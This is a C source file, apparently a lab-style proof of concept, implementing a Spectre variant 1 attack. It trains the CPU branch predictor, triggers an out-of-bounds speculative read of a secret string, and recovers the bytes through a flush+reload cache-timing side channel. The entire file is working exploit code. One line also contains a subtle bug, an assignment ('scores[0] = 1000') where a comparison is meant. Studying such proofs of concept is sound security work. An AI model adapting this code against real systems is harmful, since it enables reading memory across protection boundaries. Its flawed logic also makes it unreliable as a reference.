#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

unsigned int buffer_size = 10;
uint8_t unused1[64];

uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Some Secret Value";   
uint8_t unused2[64]; 

uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (150)
#define DELTA 0

// Sandbox Function
uint8_t victim_function(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;  
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
int mix_i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    mix_i = i;
    addr = &array[mix_i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[mix_i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;

  flushSideChannel();
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    victim_function(i);  
  }

  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { } //sleep
  //actual attack happens here
  s = victim_function(larger_x);
  array[s*4096 + DELTA] += 88;
}

int main() {
  int i,m;
  uint8_t s;
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  //flushSideChannel();
  for(m = 0;m<17;m++){
    size_t larger_x = (size_t)(secret-(char*)buffer);
    for(i=0;i<256; i++) scores[i]=0; 
    for (i = 0; i < 1000; i++) {
      //printf(""); // This seemly "useless" line is necessary for the attack to succeed
      spectreAttack(larger_x + m);
      usleep(10);
      reloadSideChannelImproved();
    }
    if(scores[0] = 1000){
      scores[0] = 0;
    }
    int max = 0;
    for (i =0; i < 256; i++){
    if(scores[max] < scores[i])  
      max = i;
    }
    printf("Reading secret value at %p = ", (void*)larger_x);
    printf("The  secret value is %d - %c\n", max, max);
    printf("The number of hits is %d\n", scores[max]);
  }
  
  return (0); 
}